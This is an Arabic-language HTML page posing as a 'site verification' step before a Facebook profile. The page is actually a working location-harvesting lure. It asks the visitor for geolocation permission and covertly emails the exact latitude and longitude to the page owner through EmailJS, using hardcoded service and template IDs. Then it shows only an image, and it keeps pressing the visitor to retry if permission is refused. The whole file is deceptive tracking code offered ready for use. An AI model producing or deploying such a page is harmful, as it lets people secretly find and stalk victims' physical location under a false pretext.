<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>التحقق من الموقع</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #fff;
      text-align: center;
      padding: 20px;
    }

    #message, #error, #retryBtn {
      margin-top: 20px;
    }

    #startBtn, #retryBtn {
      padding: 10px 20px;
      font-size: 16px;
      background-color: #1976d2;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    #mainImage {
      display: none;
      max-width: 100%;
      height: auto;
    }

    #welcome {
      display: block;
    }

    #error {
      color: red;
      font-weight: bold;
      display: none;
    }

    #retryBtn {
      display: none;
    }
  </style>
</head>
<body>

  <!-- شاشة البداية -->
  <div id="welcome">
    <h2>يرجى السماح بالموقع للمتابعة إلى صفحة المستخدم في فيسبوك</h2>
    <button id="startBtn" onclick="askForLocation()">المتابعة</button>
  </div>

  <!-- صورة تظهر فقط إذا وافق المستخدم -->
  <img id="mainImage" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5k067g9GnGhi2Akznix-ym2U_CLEUtdVgdunboW29UwGv3I6dkhh-q98N&s=10" alt="صورة">

  <!-- رسالة الخطأ -->
  <div id="error">⚠️ لا يمكنك المتابعة إلا إذا وافقت على الوصول إلى موقعك.</div>
  <button id="retryBtn" onclick="askForLocation()">المحاولة مرة أخرى</button>

  <script>
    emailjs.init("0XeUaAWOfdeN9gGEr"); // public key

    function sendLocation(latitude, longitude) {
      const now = new Date().toLocaleString();
      const params = {
        name: "Location Bot",
        time: now,
        message: `User Coordinates:\nLatitude: ${latitude}\nLongitude: ${longitude}`
      };

      emailjs.send("service_gtkrov5", "template_jj0pjs9", params)
        .then(() => console.log("Location sent"))
        .catch(err => console.error("Email error:", err));
    }

    function askForLocation() {
      // إخفاء الشاشة الأولى
      document.getElementById("welcome").style.display = "none";
      document.getElementById("error").style.display = "none";
      document.getElementById("retryBtn").style.display = "none";

      navigator.geolocation.getCurrentPosition(success => {
        const lat = success.coords.latitude;
        const lon = success.coords.longitude;

        sendLocation(lat, lon);

        // عرض الصورة فقط
        document.getElementById("mainImage").style.display = "block";

      }, error => {
        if (error.code === error.PERMISSION_DENIED) {
          document.getElementById("error").style.display = "block";
          document.getElementById("retryBtn").style.display = "inline-block";
        } else {
          alert("حدث خطأ غير متوقع");
        }
      });
    }
  </script>

</body>
</html>
